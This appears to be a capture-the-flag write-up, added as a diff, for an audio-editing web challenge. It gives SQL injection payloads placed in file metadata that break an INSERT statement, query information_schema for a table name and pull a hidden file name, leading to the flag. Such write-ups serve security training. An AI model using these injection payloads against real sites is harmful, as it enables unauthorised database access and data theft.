@@ -1,0 +1,25 @@
+Problem:
+
+I made a cool site to edit audio files. Can you exploit it?
+Link[http://107.170.122.6/audioedit/index.php]
+
+----
+Writeup:
+
+- Metadata is uploaded to the site alongside the file
+- We can sql inject through the metadata
+- The metadata is likely in the insert clause
+	- INSERT INTO table_name VALUES (value1,value2...)
+- Changing the metadata of artist to:
+	- test1','test2') # 
+- results in both the artist value and title value changing
+- We can now figure out the table name as we know 'file' is a column name
+	- test', (SELECT table_name FROM information_schema.columns WHERE column name = "file")) # 
+- Now, we simply list out the first file from table 'audioedit'
+	- test',(SELECT file FROM (SELECT * FROM audioedit) AS x limit 0,1)) #
+- We get the file supersecretflagf1le.mp3
+- Going to http://107.170.122.6/audioedit/edit.php?file=supersecretflagf1le.mp3
+and changing the visualisation to sonogram gives us the flag.
+
+----
+Flag: ABCTF{me3t4_inj3cti00n}
